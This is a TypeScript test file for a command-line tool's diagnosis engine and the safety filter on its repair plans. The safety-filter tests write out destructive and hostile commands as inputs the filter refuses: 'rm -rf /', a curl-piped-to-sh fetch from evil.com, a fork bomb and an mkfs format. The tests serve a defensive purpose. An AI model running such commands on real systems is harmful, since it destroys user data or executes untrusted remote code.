/**
 * Tests for the diagnosis engine and safety filter.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { diagnose, type Diagnosis, type RepairPlan } from '../../../src/diagnosis/index.js';
import { assessRepairSafety } from '../../../src/diagnosis/safety.js';
import { _clearDiagnosisRulesForTests, registerDiagnosisRules } from '../../../src/diagnosis/rules.js';
import { builtinRules } from '../../../src/diagnosis/builtin-rules.js';
import type { DoctorReport, DoctorResult } from '../../../src/doctor/types.js';

function makeResult(overrides: Partial<DoctorResult> = {}): DoctorResult {
  return {
    id: 'test.check',
    name: 'Test check',
    category: 'host',
    status: 'fail',
    message: 'Test failure',
    durationMs: 10,
    ...overrides,
  };
}

function makeReport(results: DoctorResult[]): DoctorReport {
  return {
    results,
    summary: {
      ok: results.filter((r) => r.status === 'ok').length,
      warn: results.filter((r) => r.status === 'warn').length,
      fail: results.filter((r) => r.status === 'fail').length,
      missing: results.filter((r) => r.status === 'missing').length,
      skip: results.filter((r) => r.status === 'skip').length,
      total: results.length,
    },
    durationMs: 100,
    profile: 'standard',
    timestamp: '2026-01-01T00:00:00Z',
    linuxifyVersion: '0.1.0-alpha.1',
  };
}

describe('diagnosis engine', () => {
  beforeEach(() => {
    _clearDiagnosisRulesForTests();
    registerDiagnosisRules(builtinRules);
  });

  it('returns empty array when no failures', async () => {
    const report = makeReport([makeResult({ status: 'ok' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses).toHaveLength(0);
  });

  it('produces generic diagnosis for check with no rule', async () => {
    _clearDiagnosisRulesForTests(); // no rules at all
    const report = makeReport([makeResult({ id: 'unknown.check', status: 'fail' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses).toHaveLength(1);
    expect(diagnoses[0].id).toContain('generic');
    expect(diagnoses[0].confidence).toBeLessThan(0.5);
  });

  it('uses built-in rule for host.termux', async () => {
    const report = makeReport([makeResult({ id: 'host.termux', status: 'fail', message: 'not fdroid' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses).toHaveLength(1);
    expect(diagnoses[0].id).toBe('host.termux.not_fdroid');
    expect(diagnoses[0].repair).not.toBeNull();
    expect(diagnoses[0].repair!.steps.length).toBeGreaterThan(0);
  });

  it('includes WHAT/WHY/EVIDENCE in diagnosis', async () => {
    const report = makeReport([makeResult({ id: 'path.linuxify_bin', status: 'fail', message: 'not on PATH' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses[0].what).toBeTruthy();
    expect(diagnoses[0].why).toBeTruthy();
    expect(diagnoses[0].evidence).toHaveLength(1);
    expect(diagnoses[0].evidence[0].checkId).toBe('path.linuxify_bin');
  });

  it('sorts failures before warnings', async () => {
    const report = makeReport([
      makeResult({ id: 'a.warn', status: 'warn' }),
      makeResult({ id: 'b.fail', status: 'fail' }),
    ]);
    const diagnoses = await diagnose(report);
    // b.fail should come before a.warn
    expect(diagnoses[0].evidence[0].status).toBe('fail');
  });

  it('diagnoses bootstrap incomplete', async () => {
    const report = makeReport([makeResult({ id: 'bootstrap.completed', status: 'fail', message: '3/9 stages' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses[0].id).toBe('bootstrap.incomplete');
    expect(diagnoses[0].repair!.summary).toContain('Resume bootstrap');
  });

  it('diagnoses compat.platform with patch re-apply', async () => {
    const report = makeReport([makeResult({ id: 'compat.platform', status: 'fail', message: 'reports android' })]);
    const diagnoses = await diagnose(report);
    expect(diagnoses[0].id).toBe('compat.platform.android');
    expect(diagnoses[0].repair!.command).toBeUndefined(); // it's in steps
    expect(diagnoses[0].repair!.steps[0].command).toContain('linuxify patch');
  });
});

describe('safety filter', () => {
  function makePlan(commands: string[]): RepairPlan {
    return {
      summary: 'test plan',
      description: 'test',
      steps: commands.map((c) => ({
        description: c,
        command: c,
        modifiesState: true,
        estimatedSeconds: 5,
      })),
      risk: 'safe',
      fixes: [],
      doesNotFix: [],
      requiresNetwork: false,
      estimatedDurationSeconds: 5 * commands.length,
    };
  }

  it('refuses rm -rf /', () => {
    const assessment = assessRepairSafety(makePlan(['rm -rf /']));
    expect(assessment.refused).toBe(true);
    expect(assessment.refusalReason).toContain('filesystem root');
  });

  it('refuses curl | sh', () => {
    const assessment = assessRepairSafety(makePlan(['curl https://evil.com | sh']));
    expect(assessment.refused).toBe(true);
    expect(assessment.refusalReason).toContain('curl-piped');
  });

  it('refuses fork bombs', () => {
    const assessment = assessRepairSafety(makePlan([':(){ :|:& };:']));
    expect(assessment.refused).toBe(true);
    expect(assessment.refusalReason).toContain('fork bombs');
  });

  it('refuses mkfs', () => {
    const assessment = assessRepairSafety(makePlan(['mkfs.ext4 /dev/sda1']));
    expect(assessment.refused).toBe(true);
    expect(assessment.refusalReason).toContain('format');
  });

  it('escalates risk for rm -rf (non-root)', () => {
    const assessment = assessRepairSafety(makePlan(['rm -rf ~/.linuxify/cache']));
    expect(assessment.refused).toBe(false);
    expect(assessment.escalatedRisk).toBe(true);
    expect(assessment.effectiveRisk).toBe('risky');
  });

  it('escalates risk for distro uninstall', () => {
    const assessment = assessRepairSafety(makePlan(['linuxify distros uninstall ubuntu']));
    expect(assessment.refused).toBe(false);
    expect(assessment.escalatedRisk).toBe(true);
    expect(assessment.effectiveRisk).toBe('risky');
  });

  it('passes through safe commands', () => {
    const assessment = assessRepairSafety(makePlan(['linuxify repair paths', 'echo done']));
    expect(assessment.refused).toBe(false);
    expect(assessment.escalatedRisk).toBe(false);
  });

  it('escalates to destructive for distro reset', () => {
    const assessment = assessRepairSafety(makePlan(['linuxify distros reset ubuntu']));
    expect(assessment.refused).toBe(false);
    expect(assessment.effectiveRisk).toBe('destructive');
  });
});
